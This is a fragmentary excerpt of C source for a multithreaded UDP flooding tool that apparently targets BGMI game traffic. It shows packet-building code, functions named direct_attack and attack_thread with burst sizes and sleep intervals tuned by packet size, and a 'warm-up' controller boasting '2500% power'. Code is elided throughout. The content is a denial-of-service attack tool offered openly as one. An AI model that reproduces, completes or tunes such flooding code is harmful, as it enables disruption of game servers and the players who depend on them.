...
#define WARMUP_BURST_MULTIPLIER 25
#define WARMUP_SLEEP_DIVIDER 25
...
void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed, int is_warmup) {
    ...
    if (is_warmup) {
        int warmup_sizes[] = {24, 28, 32, 36, 40, 44, 48, 52, 56, 60, 64, 68, 72};
        int idx = fast_rand(seed) % 13;
...
void *direct_attack(void *arg) {
    ...
    int optimal_burst;
    if (PACKET_SIZE <= 40) {
        optimal_burst = 800 + (rand() % 400);
    } else if (PACKET_SIZE <= 60) {
        optimal_burst = 600 + (rand() % 300);
    } else {
        optimal_burst = 400 + (rand() % 200);
    }
...
void *attack_thread(void *arg) {
    ...
    if (PACKET_SIZE <= 40) {
        packets_per_burst = 250 + (tid % 200);
        sleep_microseconds = 600;
    } else if (PACKET_SIZE <= 60) {
        packets_per_burst = 180 + (tid % 150);
        sleep_microseconds = 1200;
    } else {
        packets_per_burst = 120 + (tid % 100);
...
void *warmup_controller(void *arg) {
    printf("⚡ Warm-up: %d seconds (2500%% power)...\n", WARMUP_SECONDS);
